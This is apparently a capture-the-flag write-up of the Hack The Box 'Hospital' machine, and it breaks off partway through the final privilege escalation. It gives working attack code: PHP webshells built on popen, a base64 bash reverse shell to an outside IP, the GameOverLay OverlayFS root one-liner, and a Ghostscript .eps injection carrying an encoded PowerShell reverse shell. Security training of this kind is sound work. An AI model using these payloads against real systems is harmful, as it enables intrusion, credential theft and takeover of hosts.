### Nmap Scan
I start out by running an nmap scan
```bash
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-11-19 08:19:36Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Issuer: commonName=DC.hospital.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-05T18:39:34
| Not valid after:  2024-03-06T18:39:34
| MD5:   0c8a:ebc2:3231:590c:2351:ebbf:4e1d:1dbc
|_SHA-1: af10:4fad:1b02:073a:e026:eef4:8917:734b:f8e3:86a7
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2023-11-19T08:20:33+00:00
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6069/tcp open  msrpc             Microsoft Windows RPC
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6409/tcp open  msrpc             Microsoft Windows RPC
6612/tcp open  msrpc             Microsoft Windows RPC
6636/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.55 (Ubuntu)
| http-title: Login
|_Requested resource was login.php
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-11-19T08:20:34
|_  start_date: N/A
```
Right off the bat, DNS and LDAP lead me to believe this is a domain controller. However, there's some other unusual stuff going on. For one thing, HTTPS on port 443 is running `Apache httpd 2.4.56 ((Win64)` but HTTP on port 8080 is running `Apache httpd 2.4.55 ((Ubuntu))`. The difference in OS here, combined with VMRDP running on port 2179, leads me to believe the site on port 8080 is running in a virtual machine inside the Windows host. RDP on port 3389 and MSMQ on port 1801 are also less common to see on domain controllers.

In the output for LDAP, as well as RDP, I see the domain name `hospital.htb`, as well as the computer name `DC`. I add the following entries to me `/etc/hosts` file
```bash
<BOX IP>	hospital.htb dc.hospital.htb dc
```
### No Anonymous login for SMB or LDAP
To check for some low hanging fruit, I try for anonymous log on for SMB and LDAP, but am unsuccessful
```bash
(kali㉿Kali)──[13:46:58]──[~/htb/Machines/Hospital]
└─$ cme smb $IP -u '' -p ''                             
SMB         10.129.54.212   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.129.54.212   445    DC               [-] hospital.htb\: STATUS_ACCESS_DENIED 
                                                                                                                                                                                                                                                              
┌──(kali㉿Kali)──[13:47:34]──[~/htb/Machines/Hospital]
└─$ cme ldap $IP -u '' -p ''    
SMB         10.129.54.212   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
LDAP        10.129.54.212   445    DC               [-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090CF4, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
LDAPS       10.129.54.212   636    DC               [+] hospital.htb\:
```
I also try providing no password, and a fake username with a blank password, neither are successful.
### HTTP Port 8080
Port 8080 hosts a login page for an unknown service. The site is running php. There is a button to make an account. I try some basic SQLi and type juggling, but am unsuccessful. I then make an account. Once logged in, there is a file upload function.
![[Pasted image 20231125135134.png]]
![[Pasted image 20231125135224.png]]
### Ferosbuster output
I run a `feroxbuster` scan to find directories and files. I add the extension for `.php`, and I supply it with the cookie for my logged in session. I also add `-A` to use a random user agent, and `-n` to stop recursion, as I just want to see what directories are present, and not spend a bunch of time recursing into everything.
```bash
┌──(kali㉿Kali)──[13:50:46]──[~/htb/Machines/Hospital]
└─$ feroxbuster -u http://hospital.htb:8080 -A -n -x php -b 'Cookie: PHPSESSID=6kagckfdf90sju9l5chgrv11hd'

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://hospital.htb:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🤯  Header                │ Cookie: Cookie: PHPSESSID=6kagckfdf90sju9l5chgrv11hd
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://hospital.htb:8080/ => login.php
301      GET        9l       28w      317c http://hospital.htb:8080/css => http://hospital.htb:8080/css/
301      GET        9l       28w      321c http://hospital.htb:8080/uploads => http://hospital.htb:8080/uploads/
200      GET        0l        0w        0c http://hospital.htb:8080/config.php
200      GET        0l        0w        0c http://hospital.htb:8080/upload.php
302      GET        0l        0w        0c http://hospital.htb:8080/logout.php => login.php
302      GET        0l        0w        0c http://hospital.htb:8080/index.php => login.php
301      GET        9l       28w      319c http://hospital.htb:8080/fonts => http://hospital.htb:8080/fonts/
301      GET        9l       28w      320c http://hospital.htb:8080/images => http://hospital.htb:8080/images/
301      GET        9l       28w      316c http://hospital.htb:8080/js => http://hospital.htb:8080/js/
200      GET      133l      439w     5739c http://hospital.htb:8080/login.php
200      GET       79l      132w     2106c http://hospital.htb:8080/js/main.js
200      GET       92l      257w     2841c http://hospital.htb:8080/vendor/countdowntime/countdowntime.js
200      GET        1l       66w     5640c http://hospital.htb:8080/vendor/tilt/tilt.jquery.min.js
200      GET        5l       45w     1609c http://hospital.htb:8080/images/icons/logo.png
200      GET        1l      308w    15196c http://hospital.htb:8080/vendor/select2/select2.min.css
200      GET     1579l     2856w    23848c http://hospital.htb:8080/vendor/animate/animate.css
200      GET        4l       66w    31000c http://hospital.htb:8080/fonts/font-awesome-4.7.0/css/font-awesome.min.css
200      GET        1l      914w    51599c http://hospital.htb:8080/vendor/countdowntime/moment.min.js
200      GET        6l      590w    51143c http://hospital.htb:8080/vendor/bootstrap/js/bootstrap.min.js
200      GET        4l     1298w    86659c http://hospital.htb:8080/vendor/jquery/jquery-3.2.1.min.js
200      GET     2448l    10795w    81670c http://hospital.htb:8080/vendor/bootstrap/js/popper.js
200      GET     2890l     7798w    83645c http://hospital.htb:8080/css/util.css
200      GET        3l      881w    66664c http://hospital.htb:8080/vendor/select2/select2.min.js
200      GET        1l    27683w   184353c http://hospital.htb:8080/vendor/countdowntime/moment-timezone-with-data.min.js
200      GET      453l     2433w   191315c http://hospital.htb:8080/images/bg01.jpg
200      GET        7l     1258w   124962c http://hospital.htb:8080/vendor/bootstrap/css/bootstrap.min.css
200      GET      797l     3769w   439791c http://hospital.htb:8080/images/bg02.jpg
200      GET     1030l     5464w   416253c http://hospital.htb:8080/images/bg03.jpg
200      GET      113l      341w     5125c http://hospital.htb:8080/register.php
200      GET        1l      182w     6017c http://hospital.htb:8080/vendor/countdowntime/moment-timezone.min.js
200      GET        9l       73w    39654c http://hospital.htb:8080/images/icons/favicon.ico
200      GET      609l     1090w    13948c http://hospital.htb:8080/css/main.css
301      GET        9l       28w      320c http://hospital.htb:8080/vendor => http://hospital.htb:8080/vendor/
200      GET       83l      208w     3536c http://hospital.htb:8080/success.php
[####################] - 2m     30055/30055   0s      found:35      errors:0      
[####################] - 2m     30000/30000   270/s   http://hospital.htb:8080/
```
In the output I see `config.php`, which could be useful, but it has a size of 0, so I know the page just displays blank. I also see `upload.php`, which could be useful to find the logic used for filtering the file upload, but that comes back as blank as well. There is also a `/uploads` directory, which could be useful. If the file names of uploaded files are not obfuscated, and I can manage to get a malicious file through the upload, I can browse to and execute it in the `/uploads` directory.
### File Upload
I attempt to upload a `.php` file and unsurprisingly, this fails, redirecting to `/failed.php`

I attempt a very basic bypass and just intercept the file in Burpsuit, and change the file name to `test.jpg`, and the upload succeeds!
![[Pasted image 20231125140628.png]]
![[Pasted image 20231125140647.png]]
I then test if the filename gets obfuscated by browsing to `/uploads/test.jpg`, and there's my file! It doesn't display, because the file isn't a valid jpeg, but the file is there!
![[Pasted image 20231125140711.png]]
The next extension I try is `.phar` which is a php archive file. This file will be executed like a `.php` file if I browse to it, but is often forgotten about in file upload filters. I intercept the request in Burp, and change the file to a `.phar` extension, and when I browse to it, my code is executed!
![[Pasted image 20231125140838.png]]
I upload a simple webshell to try and get command execution
```php
<?php system($_REQUEST['c']); ?>
```
But when I attempt to use it, I get no output.
![[Pasted image 20231125141415.png]]
I then try to upload the [this updated version](https://github.com/ivan-sincek/php-reverse-shell) of the old pentest monkey php reverse shell. I get a quick connection on my netcat listener, but it closes instantly and I get this error on the webpage:
```
DAEMONIZE: pcntl_fork() does not exists, moving on...
PROC_ERROR: Cannot start the shell
```
![[Pasted image 20231125141821.png]]
	--------------
##### *SIDE NOTE: Better PHP Web Shell*
*Towards the end of completing this box, I found another php webshell called [p0wny-shell](https://github.com/flozz/p0wny-shell) which is extremely powerful. Uploading this shell works no problem at this step to give me command execution.*
	---------------
	--------------
	
This is interesting. I want to get more information about the php enviroment, so i upload a file just containing:
```php
<?php
phpinfo();
?>
```
This will print a ton of info about the php enviroment into a nicely formatted html page that I can browse to. I go and check the `disable_functions` section.
![[Pasted image 20231125142436.png]]
Reading through the disabled functions explains why my webshell and reverse shell failed: `system` is disabled, same with a bunch of `pcntl` functions.

[PCNTL or Process Control Functions](https://www.php.net/manual/en/intro.pcntl.php) are a set of php functions for process handling in Unix-like operating systems. My reverse shell requires these functions, and are why it failed.

Reading through the disabled functions and cross checking it with the [HackTricks page](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass#php-command-execution) for php command execution, I notice that `popen` is not disabled. (Side note: This is the reason that p0wny-shell works no problem, it cycles through all the different ways to execute commands in php, and finds `popen` automatically.) I write a simple webshell using `popen` and upload it. This works and gives me command execution!
```php
<?php
$command = $_REQUEST['c'];
echo fread(popen("$command", "r"), 4096);
?>
```
![[Pasted image 20231125143355.png]]
With this, I am able to send a reverse shell. Sending a regular bash reverse shell fails, likely because of all the special characters. So I encode the reverse shell in base64, and in the webshell decode the base64, and pipe it to bash. I then successfully catch the shell in netcat.
```bash
# I add some spaces in particular places here to get rid of any "+" and "=", as those can get funky when sent to webservers
echo 'bash -i  >& /dev/tcp/10.10.15.34/9001 0>&1  ' | base64
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMzQvOTAwMSAwPiYxICAK

# Payload sent through the webshell:
echo 'YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTUuMzQvOTAwMSAwPiYxICAK'|base64 -d|bash
```
In the netcat shell, I use the python pty trick to get a more stable reverse shell.
```bash
┌──(kali㉿Kali)──[14:18:06]──[~/htb/Machines/Hospital/www]
└─$ nc -lvnp 9001
www-data@webserver:/var/www/html/uploads$ python3 -c 'import pty;pty.spawn("bash")'
</uploads$ python3 -c 'import pty;pty.spawn("bash")'
www-data@webserver:/var/www/html/uploads$ ^Z
zsh: suspended  nc -lvnp 9001
                                                                                                                               
┌──(kali㉿Kali)──[14:38:11]──[~/htb/Machines/Hospital/www]
└─$ stty -a                   
speed 38400 baud; rows 72; columns 127; line = 0;
                                                                                                                               
┌──(kali㉿Kali)──[14:38:19]──[~/htb/Machines/Hospital/www]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 9001

www-data@webserver:/var/www/html/uploads$ stty rows 72 columns 127 && export TERM=xterm
www-data@webserver:/var/www/html/uploads$
```
#### Root shell in VM & Cracking /etc/shadow
#### SQL Credentials
Once inside the VM, I noodle around for awhile. I don't find anything particularly out of place. I do read `config.php` from the web directory, which gives me credentials for the MySQL instance running in the VM.
```php
<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', '<REDACTED>');
define('DB_PASSWORD', '<REDACTED>');
define('DB_NAME', '<REDACTED>');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```
I log in to the SQL database and get 2 password hashes, one for `admin` and one for `patient`. Both of these crack in hashcat, however, neither of these passwords seemed to be used anywhere other than to log in to the 8080 site, so this really doesn't buy me much.

I eventually run linpeas, but don't get much useful from the output.
### GameOverLay Exploit
I eventually run `uname -a` and `cat /etc/os-release`. The VM is running Ubuntu 23.04 and kernel 5.19.0-35. I search for any known vulnerabilities in this environment and eventually find [this blog post](https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability), which is about [CVE-2023-2640](https://nvd.nist.gov/vuln/detail/CVE-2023-2640) and [CVE-2023-32629](https://nvd.nist.gov/vuln/detail/CVE-2023-32629), aka the GameOverLay exploit. This an exploit leading to local privilege escalation. I highly reccomend reading the blog post, but the short version is that it's an exploit in the OverlayFS filesystem, which allows a low-privileged user to create a binary with arbitrary capabilties, which the user can then use to set their UID to 0, aka root.

According to the blog post, Ubuntu 23.04, as well as kernel 5.19 should be vulnerable. The exploit code is actually very simple, and can be used as a one liner in bash. I find exploit code in [this github repo](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629), as well as [this one](https://github.com/vinetsuicide/CVE-2023-2640-CVE-2023-32629) 
```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```
Now let's break down this command.

	`unshare -rm sh -c`:
		`unshare`:  Is used to run a command with some namespaces unshared from the parent.
		
		`-rm`: the `-r` flag makes the shell root regardless of the UID, and `-m` creates a new mount namespace.
		
		`sh -c`: Runs the following command in a new shell, in this case `sh`.
	Inside the `sh -c` command
		
		`mkdir l u w m `: Creates 4 directories named `l`, `u`, `w`, `m`.
		
		`cp /u*/b*/p*3 l/`: Copies the Python3 binary to the `l` directory. The `*` act as wildcards, which should extend to `/usr/bin/python3`, likely used to shorten the command.
		
		`setcap cap_setuid+eip l/python3`: Gives the `CAP_SETUID` capability to the `python3` binary located in the `l` directory. The allows any process running the binary to change it's UID (User ID)
		
		`mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m`: Mounts an overlay filesystem.
			`lowerdir=l`: The `l` directory is the lower, read only layer.
			
			`upperdir=u`: The `u` directory is the upper, writable layer
			
			`workdir=w`: The `w` directory is for temp storage by the overlay filesystem
			
			`m`: The `m` directory is used as the mount point for the overlay filesystem
			
			`touch m/*;`: This command creates an empty file for every file in the `m` directory, which in this case will essentially replicate the directory structure of the lowerdir, `l`.
	
	After the initial command `&&`
		`u/python3 -c`: Runs a command with `python3`, which now has the `CAP_SETUID` from the upper, `u` directory
		
		Inside the python command:
			`import os; os.setuid(0)`: Imports the `os` module, and changes the current process UID to 0 (root)
			`os.system`: Execute the following command in a system shell
				
				`cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash`: Copies the bash binary into `/var/tmp` and makes in an SUID binary
				
				`var/tmp/bash -p`: Runs the copied bash binary with the `-p` options, which will preserve the effective UID and GID values, essentially granting root access
				
				`rm -rf l u m w /var/tmp/bash`: Cleans up by removing the created directories and the copied `bash` binary.


Namespaces are a feature of the Linux kernel that partitions kernel resources in a way that one set of processes sees one set of resources, while another set of processes sees a different set of resources. Usually, processes inherit their namespace from their parent process, meaning they share the same "view" of the system. However, you can start a new process with a seperate set of namespaces from it's parent. This effectively starts the new process in a diffrerent environment than its parent. In this command, we are creating a new environment for the `sh` shell to run in. We are then giving `python3` the `CAP_SETUID` capability, using it create an SUID copy of `bash`, and then starting a new shell with that SUID `bash` binary. The GameOverLay exploit effectively "tricks" the Ubuntu kernel into copying the files we created in our new unshared namespace, back into the rest of the system.
#### Trouble Shooting the Exploit.
Something that really tripped me up with this, is that this exploit doesn't seem to work when run in the `/dev/shm` directory. I'm not entirely sure why. `/dev/shm` is ***sh***ared ***m***emory, it's ram. Any files created in this directory are actually created in ram, and not to disk. `/dev/shm` is my usual working directory on boxes for this reason. So for awhile, I really didn't think this exploit worked for whatever reason, as I was running it in `/dev/shm`. I had successfully executed linpeas and pspy in this directory, so I knew I had execute permissions in `/dev/shm`. My best guess for why the exploit failed here, is that because it is ram, Linux has different rules for what can be done with filesystems. The exploit relies on messing with the overlay file system, and my best guess is that Linux, or Ubuntu, doesn't like that being done in ram, and needs it done to disk. When I ran the exploit in `/tmp`, it worked just fine, no problem.
### Cracking /etc/shadow
After successfully troubleshooting and running the exploit, I have free reign over the box. One of the first places I check is the `/etc/shadow` file, as that contains hashed passwords for all users on the box. I grab the hash for `drwilliams` and crack it in `hashcat`. I try this password for SMB and LDAP, and it works. I use this to dump all users for the domain and find `drwilliams` and `drbrown`
```bash
┌──(kali㉿Kali)──[15:32:33]──[~/htb/Machines/Hospital/fileupload]
└─$ cme smb $IP -u 'drwilliams' -p '<REDACTED>' --users 
SMB         10.129.54.212   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.129.54.212   445    DC               [+] hospital.htb\drwilliams:<REDACTED>
SMB         10.129.54.212   445    DC               [+] Enumerated domain user(s)
SMB         10.129.54.212   445    DC               hospital.htb\drwilliams                     badpwdcount: 0 desc: 
SMB         10.129.54.212   445    DC               hospital.htb\drbrown                        badpwdcount: 0 desc: 
<...SNIP...>
SMB         10.129.54.212   445    DC               hospital.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         10.129.54.212   445    DC               hospital.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain

```
This password also gets me into the login form on HTTPS port 443, which is for Roundcube email. In the inbox, is 1 email from `drbrown@hospital.htb`, about their project to develop new needles. `Drbrown` is asking for `.eps` files to be executed with GhostScript.
![[Pasted image 20231125163300.png]]
Searching for *".eps ghostscript exploit"*, I find [this blogpost](https://vsociety.medium.com/cve-2023-36664-command-injection-with-ghostscript-poc-exploit-97c1badce0af) about a ghostscript exploit that will execute commands injected into `.eps` files, as well as [this github repo](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection) with a PoC for the exploit. [.Eps files](https://www.adobe.com/creativecloud/file-types/image/vector/eps-file.html) are a vector file format (think .svg) used by PostScript printers and image setters. [Ghostscript](https://www.ghostscript.com/) is an interpreter for the PostScript language as well as PDF files. This exploit is tracked under [CVE-2023–36664](https://nvd.nist.gov/vuln/detail/CVE-2023-36664). The exploit was published in June 2023, fairly recent.

The exploit involves the mishandling of permission validation for pipe devices, leading to arbitrary command execution in Ghostscript up to versions 10.01.2. Pipe devices `|` are used to pass data from one process to another. In this exploit, Ghostscript does not properly check if the user has permission for these pipe devices. This means it might allow actions, such as executing a command, without properly checking if the requestor has the right to perform these actions.

I grab the github repo and use it to craft a malicious `.esp` file. There's a function in the github tool to craft a reverse shell, but looking into it, it crafts the reverse shell for Unix systems, since this is Windows box, this won't work. Instead I use the `--inject` option, and grab a base64 powershell reverse shell from [revshells.com](https://www.revshells.com/).
```bash
python3 CVE_2023_36664.py --inject --payload 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMwA0ACIALAA5ADAAMAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' --filename file.eps
```
I then upload `file.eps` and send an email to `drbrown@hospital.htb`.
![[Pasted image 20231125165235.png]]
I start a netcat listener, and after a minute or so, I catch a shell as `drbrown` on the Windows Host.

In the Documents directory I spawn into is a `.bat` file. It looks like a file for using ghostscript to execute files in `drbrown's` Downloads directory. In this script, is hardcoded `drbrown's` password! 
![[Pasted image 20231125165604.png]]
I test out these credentials with `crackmapexec` and see that I now have `winrm` and `RDP` access to the host machine.
```bash
┌──(kali㉿Kali)──[16:51:50]──[~/htb/Machines/Hospital/GhostScript_Exploit]
└─$ cme winrm $IP -u 'drbrown' -p '<REDACTED>'        
SMB         10.129.54.212   5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:hospital.htb)
HTTP        10.129.54.212   5985   DC               [*] http://10.129.54.212:5985/wsman
WINRM       10.129.54.212   5985   DC               [+] hospital.htb\drbrown:<REDACTED> (Pwn3d!)
                                                                                                                               
┌──(kali㉿Kali)──[16:56:42]──[~/htb/Machines/Hospital/GhostScript_Exploit]
└─$ cme rdp $IP -u 'drbrown' -p '<REDACTED>'
RDP         10.129.54.212   3389   DC               [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC) (domain:hospital.htb) (nla:True)
RDP         10.129.54.212   3389   DC               [+] hospital.htb\drbrown:<REDACTED> (Pwn3d!)
```
I log in with `evil-winrm` to get a better shell
```bash
┌──(kali㉿Kali)──[16:57:06]──[~/htb/Machines/Hospital/GhostScript_Exploit]
└─$ evil-winrm -i $IP -u drbrown -p '<REDACTED>'   
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\drbrown.HOSPITAL\Documents> whoami
hospital\drbrown
```
I poke around on the box for while and evenutally notice that the `Users` group can create directories and write files inside the `C:\xampp` directory! The `C:\xampp` directory is where the webserver is running out of. I run `icacls` to find this out:
```powershell
*Evil-WinRM* PS C:\xampp\htdocs> cmd.exe /c "icacls c:\xampp"
c:\xampp NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
         BUILTIN\Administrators:(I)(OI)(CI)(F)
         BUILTIN\Users:(I)(OI)(CI)(RX)
         BUILTIN\Users:(I)(CI)(AD)
         BUILTIN\Users:(I)(CI)(WD)
         CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```
The `(AD)` tag means that the `Users` group can create directories, and the `(WD)` tag means that members of the `Users` group can write files inside the directory. Now if you're used to Linux, this might not seem like a big deal. As usually the `www-data` user is running the webserver. Writing a revshell file to the webserver directory isn't that great because it can only really get you a shell as `www-data`, which you likely already have access to by the time you get a reverse shell on a Linux machine.

